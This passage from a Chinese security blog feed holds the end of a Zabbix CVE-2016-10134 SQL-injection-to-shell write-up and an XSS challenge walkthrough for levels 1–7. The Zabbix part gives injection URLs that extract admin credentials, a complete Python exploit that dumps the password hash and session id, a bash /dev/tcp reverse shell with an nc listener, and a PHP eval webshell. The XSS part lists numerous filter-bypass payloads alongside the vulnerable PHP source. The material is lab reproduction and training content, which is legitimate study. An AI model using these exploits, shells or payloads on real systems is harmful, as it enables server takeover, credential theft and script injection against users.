src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558411124994.png" alt="1558411124994"></p><p>如果guset被禁用的话，还可以使用另一种注入方式，无需账号登录。通过jsrpc.php触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558411371613.png" alt="1558411371613"></p><p>管理员账号密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(1,substring((select(select+concat(0x7e,alias,0x7e,passwd,0x7e))+from+zabbix.users+LIMIT+0,1),1,20),1)+or+1=1)%23</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558415550757.png" alt="1558415550757"></p><p>updatexml()有32位长度限制,所以使用substring拼接得出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~Admin~5fce1b3e34b520afeffb37ce08c7cd66~</span><br></pre></td></tr></table></figure><p>密码存储经过加密加盐的，从第九位开始算，截16个，去掉盐值，然后cmd5破解。</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558416909826.png" alt="1558416909826"></p><p>附上一个网上的exp，可以省点力气：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Date: 2016/8/18</span></span><br><span class="line"><span class="comment"># Created by 独自等待</span></span><br><span class="line"><span class="comment"># 博客 http://www.waitalone.cn/</span></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deteck_Sql</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">u'检查是否存在SQL注入'</span></span><br><span class="line">    payload = <span class="string">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=999'&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids%5B23297%5D=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = urllib2.urlopen(url + payload, timeout=<span class="number">10</span>).read()</span><br><span class="line">    <span class="keyword">except</span> Exception, msg:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key_reg = re.compile(<span class="string">r"INSERT\s*INTO\s*profiles"</span>)</span><br><span class="line">        <span class="keyword">if</span> key_reg.findall(response):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_Inject</span><span class="params">(sql)</span>:</span></span><br><span class="line">    <span class="string">u'获取特定sql语句内容'</span></span><br><span class="line">    payload = url + <span class="string">"jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2="</span> + urllib2.quote(</span><br><span class="line">        sql) + <span class="string">"&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17&amp;itemids[23297]=23297&amp;action=showlatest&amp;filter=&amp;filter_task=&amp;mark_color=1"</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = urllib2.urlopen(payload, timeout=<span class="number">10</span>).read()</span><br><span class="line">    <span class="keyword">except</span> Exception, msg:</span><br><span class="line">        <span class="keyword">print</span> msg</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result_reg = re.compile(<span class="string">r"Duplicate\s*entry\s*'~(.+?)~1"</span>)</span><br><span class="line">        results = result_reg.findall(response)</span><br><span class="line">        <span class="keyword">if</span> results:</span><br><span class="line">            <span class="keyword">return</span> results[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># os.system(['clear', 'cls'][os.name == 'nt'])</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">60</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t   Python Zabbix&lt;3.0.4 SQL注入 Exploit'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t    Blog：http://www.waitalone.cn/'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t\t   Code BY： 独自等待'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\t\t   Time：2016-08-18'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'+'</span> + <span class="string">'-'</span> * <span class="number">60</span> + <span class="string">'+'</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'用法: '</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' Zabbix 网站地址'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'实例: '</span> + os.path.basename(sys.argv[<span class="number">0</span>]) + <span class="string">' http://www.waitalone.cn/'</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    url = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> url[<span class="number">-1</span>] != <span class="string">'/'</span>: url += <span class="string">'/'</span></span><br><span class="line">    passwd_sql = <span class="string">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select concat(name,0x3a,passwd) from  users limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span></span><br><span class="line">    session_sql = <span class="string">"(select 1 from(select count(*),concat((select (select (select concat(0x7e,(select sessionid from sessions limit 0,1),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"</span></span><br><span class="line">    <span class="keyword">if</span> deteck_Sql():</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'Zabbix 存在SQL注入漏洞!\n'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'管理员  用户名密码：%s'</span> % sql_Inject(passwd_sql)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'管理员  Session_id：%s'</span> % sql_Inject(session_sql)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">u'Zabbix 不存在SQL注入漏洞!\n'</span></span><br></pre></td></tr></table></figure><p>直接获取到密码和session_id</p><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558419601590.png" alt="1558419601590"></p><p>登陆进后台，可通过script等功能轻易直接获取zabbix服务器的操作系统权限。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp 8989#攻击者服务器开启监听</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/ip/8989 0&gt;&amp;1#设置反弹shell脚本</span><br><span class="line">#或者写一句话</span><br><span class="line">echo&quot;&lt;?php eval($_POST[cmd])?&gt;&quot; &gt; /usr/share/webapps/zabbix/shell.php</span><br></pre></td></tr></table></figure><p><img src="/2019/05/21/zabbix-SQL注入-getshell-CVE-2016-10134/1558420615542.png" alt="1558420615542"></p><p>然后随便找台内网主机选择执行该脚本即可</p><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><p>1、禁用后台用户guest账号（第一种注入要求此账号启用）。</p><p>2、升级到zabbix的最新版。</p><p>3、zabbix的server和agent都不要以root启动</p><h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><ul><li><p><a href="https://blog.csdn.net/csacs/article/details/86656618" target="_blank" rel="noopener">https://blog.csdn.net/csacs/article/details/86656618</a> </p></li><li><p><a href="https://vulhub.org/#/environments/zabbix/CVE-2016-10134/" target="_blank" rel="noopener">https://vulhub.org/#/environments/zabbix/CVE-2016-10134/</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zabbix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS挑战之旅</title>
      <link href="/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
      <url>/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="没有任何过滤"><a href="#没有任何过滤" class="headerlink" title="没有任何过滤"></a>没有任何过滤</h3><p>根据提示点击图片</p><p><img src="/2019/05/20/XSS挑战之旅/1558054268267.png" alt="1558054268267"></p><p>跳转到如下页面</p><p><img src="/2019/05/20/XSS挑战之旅/1558054405501.png" alt="1558054405501"></p><p>发现url通过get方法传递参数</p><p>修改参数为666</p><p><img src="/2019/05/20/XSS挑战之旅/1558054498678.png" alt="1558054498678"></p><p>发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558054637265.png" alt="1558054637265"></p><p>没有任何过滤，成功执行payload</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：没有做任何过滤</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="部分过滤"><a href="#部分过滤" class="headerlink" title="部分过滤"></a>部分过滤</h3><p>输入内容666</p><p><img src="/2019/05/20/XSS挑战之旅/1558054961618.png" alt="1558054961618"></p><p>发现有两处输出相应内容的地方，第一处和上一关相同，尝试下同一paylaod</p><p><img src="/2019/05/20/XSS挑战之旅/1558055118753.png" alt="1558055118753"></p><p>发现<code>&lt;&gt;</code>被实体化转义掉了，这一处无法再进行构造了。</p><p>接下来对另一处进行构造</p><p><img src="/2019/05/20/XSS挑战之旅/1558055268881.png" alt="1558055268881"></p><p>发现<code>&lt;&gt;</code>没有被转义，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558055385539.png" alt="1558055385539"></p><p>成功执行payload，便于查看代码，我把alert去掉</p><p><img src="/2019/05/20/XSS挑战之旅/1558055539475.png" alt="1558055539475"></p><p>可以看到成功闭合前后标签，所以script标签里的js代码可以成功执行</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>有两个输出，第一个输出使用htmlspeciachars()进行转义，第二个没有任何过滤，可以在这里进行构造payload。</p><p>两种方法：</p><ol><li><p>不逃逸input标签，闭合引号添加事件触发xss</p><p>鼠标移动至该标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>等等很多事件，这里贴个网上的链接<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p></li><li><p>逃逸出input标签,使用其他标签触发xss</p><p><code>&lt;script&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure><p>等等</p></li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="实体化转义绕过"><a href="#实体化转义绕过" class="headerlink" title="实体化转义绕过"></a>实体化转义绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558056793437.png" alt="1558056793437"></p><p>看起来跟level一样，试一下闭合掉value属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558057130653.png" alt="1558057130653"></p><p>闭合语句虽然没有问题，但是看起来被转义掉了</p><p><img src="/2019/05/20/XSS挑战之旅/1558056967968.png" alt="1558056967968"></p><p>双引号被转义，再尝试一下单引号<code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558057294923.png" alt="1558057294923"></p><p>可以看出来 <code>value=&quot;&quot;</code> 成功闭合，但是 <code>&lt;&gt;</code> 依旧被转义</p><p>再尝试另一种办法，添加事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558057537275.png" alt="1558057537275"></p><p>可以看到成功触发事件属性里的js代码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>两个输出点都做了htmlspecialchars()转义，但是第二个拼接的语句使用了单引号<code>&#39;</code>，而且htmlspecialchars()函数使用默认参数不会对单引号进行转义，所以可以使用单引号闭合前面的属性</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="事件属性逃逸"><a href="#事件属性逃逸" class="headerlink" title="事件属性逃逸"></a>事件属性逃逸</h3><p>跟上关很像，试一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558057712688.png" alt="1558057712688"></p><p>发现<code>&lt;&gt;</code>全部被过滤掉了，那就使用事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>成功执行payload</p><p><img src="/2019/05/20/XSS挑战之旅/1558096380758.png" alt="1558096380758"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第二个输出点对<code>&lt;&gt;</code>进行了替换，使用事件属性进行构造payload</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>构造如下payload</p><p><img src="/2019/05/20/XSS挑战之旅/1558096540426.png" alt="1558096540426"></p><p>发现只有script被和谐了， ~ o(<em>￣▽￣</em>)ブ</p><p>使用非<code>&lt;script&gt;</code>的html标签绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558098248009.png" alt="1558098248009"></p><p>使用触发事件绕过</p><p><img src="/2019/05/20/XSS挑战之旅/1558098351438.png" alt="1558098351438"></p><p>发现on被过滤，大小写也不行，暂没有找到不用on的😂</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>首先使用strtolower()函数把字符串转换为小写，然后对<code>&lt;script</code>和<code>on</code>进行replace替换，那就用不了事件属性了，只能使用闭合标签的方式</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>script被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100639552.png" alt="1558100639552"></p><p>src被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100187489.png" alt="1558100187489"></p><p>href被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/1558100233619.png" alt="1558100233619"></p><p>on被过滤，事件属性不行了</p><p><img src="/2019/05/20/XSS挑战之旅/1558100422464.png" alt="1558100422464"></p><p>有一点点尬住了，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有使用strtolower()函数，可以大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558102420262.png" alt="1558102420262"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558105060724.png" alt="1558105060724"></p><p>on没了，被替换为空，接着试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558105341248.png" alt="1558105341248"></p><p>src和script也没了</p><p>想到了双写，成功绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558105662485.png" alt="1558105662485"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span 